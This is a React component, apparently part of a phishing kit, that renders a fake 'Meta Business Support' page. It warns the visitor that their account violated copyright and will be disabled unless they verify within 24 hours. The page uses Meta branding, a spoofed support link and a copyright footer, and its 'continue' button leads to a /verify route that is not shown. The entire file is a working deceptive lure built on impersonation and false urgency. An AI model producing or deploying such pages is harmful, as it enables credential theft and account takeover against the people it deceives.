import React from 'react';
import './Fbpage.css';
import { Link } from 'react-router-dom';

function Fbpage() {
    const headerStyle = {
        background: '#fff',
        borderBottom: '.5px solid rgba(0, 0, 0, .15)',
    };

    const buttonStyle = {
        background: 'rgb(26, 115, 232)',
        width: '100%',
        fontSize: '16px',
        lineHeight: '0px',
        borderRadius: '5px',
        cursor: 'pointer',
    };

    return (
        <>
            <div className="welcome">
                <header className="header-section" style={headerStyle}>
                    <div className="header-container">
                        <div className="w-25">
                            <div className="logo-area">
                                <img
                                    width="64"
                                    src="images.png"
                                    alt="Meta Business Support"
                                    // style={{ border: 'solid 1px rgba(0,0,0,0.15)', borderRadius: '50%' }}
                                />
                            </div>
                        </div>
                    </div>
                </header>
                <div className="body mb-5 new-body">
                    <div className="form-wrapper">
                        <h3>Account will be deactivated</h3>
                        <div className="blok1">
                            Your account or the page you use has violated copyright. We will immediately limit your account or permanently disable it for non-compliance with our terms of service.
                        </div>
                        <div className="blok1">
                            If you think we've accidentally suspended your account, you have <b>24 hours</b> to verify your account. If you miss this security notification, your account will be permanently disabled.
                        </div>
                        <div className="select-issue">
                            <div className="form-check mb-3">
                                <table border="0" cellSpacing="0" cellPadding="0" style={{ borderCollapse: 'collapse' }}>
                                    <tbody>
                                        <tr>
                                            <td valign="top">
                                                <a href="https://www.facebook.com/metasupportpros" style={{ color: '#1b74e4', textDecoration: 'none' }}>
                                                    <img
                                                        width="64"
                                                        src="TbXLmqW3Z.png"
                                                        alt="Meta Business Support"
                                                        style={{ border: 'solid 1px rgba(0,0,0,0.15)', borderRadius: '50%' }}
                                                    />
                                                </a>
                                            </td>
                                            <td>
                                                <div className="Tex5 text-meta">Meta Business Support</div>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                            <div className="Tex3">We will walk you through several steps to cancel a deactivated account.</div>
                            <div className="justify-content-end w-full">
                                <Link className="btn btn-lg btn-primary new-button" to="/verify" style={buttonStyle}>
                                    continue
                                </Link>
                            </div>
                        </div>
                    </div>
                    <div className="mEtcORP">Meta © 2024</div>
                </div>
            </div>
        </>
    );
}

export default Fbpage;
